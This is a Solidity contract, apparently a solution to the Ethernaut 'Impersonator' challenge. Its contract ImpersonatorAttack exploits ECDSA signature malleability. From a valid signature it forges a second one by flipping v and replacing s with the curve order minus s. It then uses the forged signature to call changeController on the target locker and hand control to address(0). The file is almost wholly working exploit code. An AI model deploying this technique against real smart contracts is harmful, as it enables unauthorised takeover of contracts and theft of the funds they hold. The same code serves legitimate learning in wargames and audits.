// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IImpersonator {
    function lockers(uint256 index) external view returns (IECLocker);
}

interface IECLocker {
    function open(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external;
}

contract ImpersonatorAttack {
    IECLocker public locker;
    uint256 private constant CURVE_ORDER_N =
        115792089237316195423570985008687907852837564279074904382605163141518161494337;

    constructor(address _targetAddress) {
        IImpersonator _impersonator = IImpersonator(_targetAddress);
        locker = _impersonator.lockers(0);
    }

    function attack(
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        uint8 _nv;
        bytes32 _nr;
        bytes32 _ns;

        // use another v and s
        if (_v == 27) {
            _nv = 28;
        } else {
            _nv = 27;
        }
        _ns = bytes32(CURVE_ORDER_N - uint256(_s));
        _nr = _r;

        locker.changeController(_nv, _nr, _ns, address(0));
    }

    function test(
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        locker.open(_v, _r, _s);
    }
}
